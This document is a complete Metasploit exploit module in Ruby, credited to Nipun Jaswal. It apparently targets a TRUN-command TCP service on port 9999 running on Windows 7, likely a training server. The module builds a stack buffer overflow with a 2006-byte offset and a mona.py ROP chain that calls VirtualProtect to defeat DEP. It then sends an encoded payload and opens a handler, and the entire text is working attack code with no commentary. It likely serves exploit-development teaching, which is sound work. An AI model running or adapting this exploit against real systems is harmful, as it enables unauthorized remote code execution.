require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking
	
	include Msf::Exploit::Remote::Tcp
	
	def initialize(info = {})
		super(update_info(info,'Name'=> 'DEP Bypass Exploit',
		'Description' => %q{DEP Bypass Using ROP Chains 
		Example Module},
'Platform' => 'win',
'Author' =>['Nipun Jaswal'],
'Payload' =>
	{ 'space' => 312,
	  'BadChars' => "\x00",
	},
'Targets' =>[
	['Windows 7 Home Basic',{ 'Offset' => 2006}]
],
'DisclosureDate' => 'Apr 29 2016'
))
register_options(
[
Opt::RPORT(9999)
],self.class)
end
def create_rop_chain()
# rop chain generated with mona.py - www.corelan.be
rop_gadgets =
[
0x7722d479, # POP ECX # RETN [msvcrt.dll]
0x6250609c, # ptr to &VirtualProtect() [IAT essfunc.dll]
0x7648fd52, # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN
[MSCTF.dll]
0x77276de4, # POP EBP # RETN [msvcrt.dll]
0x77492273, # & jmp esp [NSI.dll]
0x77231834, # POP EAX # RETN [msvcrt.dll]
0xfffffdff, # Value to negate, will become 0x00000201
0x76d6f3a8, # NEG EAX # RETN [RPCRT4.dll]
0x7648f9f1, # XCHG EAX,EBX # RETN [MSCTF.dll]
0x77231834, # POP EAX # RETN [msvcrt.dll]
0xffffffc0, # Value to negate, will become 0x00000040
0x765c4802, # NEG EAX # RETN [user32.dll]
0x770cbd3a, # XCHG EAX,EDX # RETN [kernel32.dll]
0x77229111, # POP ECX # RETN [msvcrt.dll]
0x74ed741a, # &Writable location [mswsock.dll]
0x774b2963, # POP EDI # RETN [USP10.dll]
0x765c4804, # RETN (ROP NOP) [user32.dll]
0x7723f5d4, # POP EAX # RETN [msvcrt.dll]
0x90909090, # nop
0x774c848e, # PUSHAD # RETN [USP10.dll]
].flatten.pack("V*")
return rop_gadgets
end
def exploit
connect
rop_chain = create_rop_chain()
junk = rand_text_alpha_upper(target['Offset'])
buf = "TRUN ."+junk + rop_chain + make_nops(16) +
payload.encoded+'\r\n'
sock.put(buf)
handler
disconnect
end
end

